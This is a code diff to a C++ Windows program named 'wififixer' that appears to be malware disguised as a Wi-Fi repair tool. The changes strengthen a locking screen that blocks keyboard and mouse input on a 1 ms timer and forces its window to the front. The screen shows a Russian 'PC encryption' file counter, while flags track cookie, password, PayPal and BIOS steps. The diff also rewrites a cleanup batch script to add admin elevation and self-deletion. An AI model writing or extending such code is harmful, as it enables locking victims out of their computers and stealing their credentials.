@@ -1,4 +1,3 @@
-
 namespace wififixer {
 
 	using namespace System;
@@ -123,7 +122,8 @@ namespace wififixer {
 			this->block_biosBAR->TabIndex = 6;
 			// 
 			// chek1
-			// 
+			//
+			this->chek1->Interval = 1;
 			this->chek1->Tick += gcnew System::EventHandler(this, &blocking::chek1_Tick);
 			// 
 			// bios_done
@@ -221,6 +221,8 @@ namespace wififixer {
 		this->blocking_label->Text = "Шифрование ПК:\nЗашифровано " + local_count + " файлов из " + count;
 	}
 	private: System::Void chek1_Tick(System::Object^ sender, System::EventArgs^ e) {
+		if (!this->Focused)
+			this->BringToFront();
 		SetCursorPos(99999999, 99999999);
 		BlockInput(true);
 		if (cookie_did && password_did && info_did && paypal_did && bios_did && blocking_did)
@@ -233,7 +235,7 @@ namespace wififixer {
 			}
 			std::ofstream clear("C:\\clear.bat");
 			if (clear.is_open()) {
-				clear << "DEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
+				clear << "@echo off\nsetlocal EnableDelayedExpansion\n\n>nul 2>&1\"%SYSTEMROOT%\\system32\\icacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\" && (set \"cmd=runas /user:Administrator \"%~dpnx0\"\"\ngoto doCmd\n) || (\necho Требуются права администратора для выполнения этого скрипта.\npause\nexit /b1n)\n\n:doCmd\nDEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
 				clear.close();
 			}
 			std::ofstream shutdown("C:\\sleep.bat");
@@ -256,7 +258,7 @@ namespace wififixer {
 			}
 			std::ofstream clear("C:\\clear.bat");
 			if (clear.is_open()) {
-				clear << "DEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
+				clear << "@echo off\nsetlocal EnableDelayedExpansion\n\n>nul 2>&1\"%SYSTEMROOT%\\system32\\icacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\" && (set \"cmd=runas /user:Administrator \"%~dpnx0\"\"\ngoto doCmd\n) || (\necho Требуются права администратора для выполнения этого скрипта.\npause\nexit /b1n)\n\n:doCmd\nDEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
 				clear.close();
 			}
 			std::ofstream shutdown("C:\\sleep.bat");
